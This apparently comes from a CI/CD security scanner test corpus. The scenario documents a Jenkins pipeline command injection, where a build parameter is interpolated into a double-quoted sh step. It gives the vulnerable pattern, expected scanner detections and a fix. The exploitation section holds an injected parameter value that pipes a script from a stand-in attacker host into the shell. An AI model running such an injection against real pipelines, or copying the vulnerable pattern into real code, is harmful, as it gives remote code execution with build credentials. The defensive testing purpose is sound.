# Scenario 128: Jenkins — shell step interpolates a build parameter (`params.*` injection)

**Provider:** Jenkins · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution) · **Severity: high**

**Vulnerable pipeline:** [`Jenkinsfile`](Jenkinsfile)

## The pattern

```groovy
parameters { string(name: 'IMAGE_TAG', defaultValue: 'latest') }
steps {
  sh "docker build -t myapp:${params.IMAGE_TAG} ."     // interpolated, double-quoted
}
```

A build parameter is spliced into a **double-quoted** `sh` body. Groovy
substitutes `${params.IMAGE_TAG}` *before* the shell parses the line, so the
value gets full shell-grammar reach. Single-quoted Groovy strings
(`sh '... $X ...'`) don't interpolate and are safe; this is specifically the
double-quoted build-parameter source (distinct from JF-002's SCM env vars and
JF-033's `withCredentials` leak).

## How an attacker exploits it

A `string` parameter is free-form text set by whoever queues the run — anyone
with Build permission, an upstream `build job:` passing `parameters:`, or a
webhook / remote trigger. Queue a build with:

```
IMAGE_TAG = x ; curl https://attacker.tld/x.sh | sh ;
```

and the injected command runs on the agent in the build's full credential
context. The Jenkins peer of the GHA `${{ inputs.X }}` (scenario 13) and ADO
`${{ parameters.X }}` injection rules.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `JF-036` — _script step interpolates a build parameter (`params.*`)_ |
| ciguard | — |

## Fix

Bind the parameter to an env var and reference it through a **single-quoted**
body, so the shell (not Groovy) resolves it and the value stays one literal
argument:

```groovy
withEnv(["IMAGE_TAG=${params.IMAGE_TAG}"]) {
  sh 'docker build -t "myapp:$IMAGE_TAG" .'
}
```

## References

- Jenkins — Pipeline `sh` / string interpolation security: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation
- Jenkins — Parameters: https://www.jenkins.io/doc/book/pipeline/syntax/#parameters
